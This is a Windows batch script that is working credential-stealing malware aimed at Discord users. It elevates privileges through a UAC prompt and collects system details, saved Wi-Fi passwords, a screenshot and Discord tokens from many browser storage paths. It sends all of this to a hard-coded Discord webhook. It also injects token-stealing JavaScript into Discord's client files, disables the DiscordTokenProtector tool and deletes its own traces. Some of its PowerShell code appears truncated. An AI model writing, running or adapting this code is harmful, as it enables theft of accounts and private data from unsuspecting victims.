@echo off
set webhook=https://discord.com/api/webhooks/935046615843106816/_mZ1X9R_ZG-tv8Zu1nQ6Fefihsdt-AUNVzFhOUjjhShOiQ0gnXiv9xzFht5VzLraNSot

@echo off

:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

:check_Permissions
    

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )


:starti
set /a killdc = 0

curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt

powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "


echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
   
)

:aftertesti

ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end

echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >NUL
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 



curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
 


echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $db_path = @( >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo ) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1 
echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = ">>> ||@everyone|| **New Token** ``` " >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1

set /a app = 0 
set /a voice = 0
if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
:a
if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
set /a app=%app%+1
if %app% == 10 goto c
goto a
:c
set /a app=0 
set /a voice=%voice%+1 
if %voice% == 99 goto e
goto a
:b 
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js 
if %killdc% == 1 goto d
goto e
:d

taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json

del %userprofile%\AppData\Local\Temp\ip.txt 
del %userprofile%\AppData\Local\Temp\ipp.txt 
del %userprofile%\AppData\Local\Temp\sysi.txt 
del %userprofile%\AppData\Local\Temp\System_INFO.txt 
del %userprofile%\AppData\Local\Temp\netstat.txt 
del %userprofile%\AppData\Local\Temp\test.ps1 
del %userprofile%\AppData\Local\Temp\programms.txt 
del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
del %userprofile%\AppData\Local\Temp\uuid.txt
del %userprofile%\AppData\Local\Temp\testtttt.ps1 
del %userprofile%\AppData\Local\Temp\wlan.txt
